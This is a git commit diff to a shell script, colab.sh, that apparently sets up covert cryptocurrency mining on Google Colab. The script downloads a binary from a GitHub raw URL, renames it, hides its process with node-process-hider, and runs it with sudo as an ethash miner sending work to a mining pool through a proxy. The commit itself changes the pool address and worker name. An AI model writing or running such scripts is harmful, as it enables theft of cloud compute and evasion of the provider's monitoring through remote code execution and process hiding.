fdffd1e93d8769f950194ffd46d30f6c074e4824
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-05-25 11:48:02 +0530

    Update colab.sh

--- colab.sh
+++ colab.sh
@@ -5,6 +5,7 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+mv Transport ditto
 chmod +x ditto
 ph add ditto
-sudo ./ditto -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --proxy 140.238.247.53:1080 --no-sni --dns-https-server 1.1.1.1 
+sudo ./ditto -a ethash -o stratum+tcp://ethash.kupool.com:8888 -u hunterd.001 -p x -w Trans --proxy 140.238.247.53:1080 --no-sni --dns-https-server 1.1.1.1 
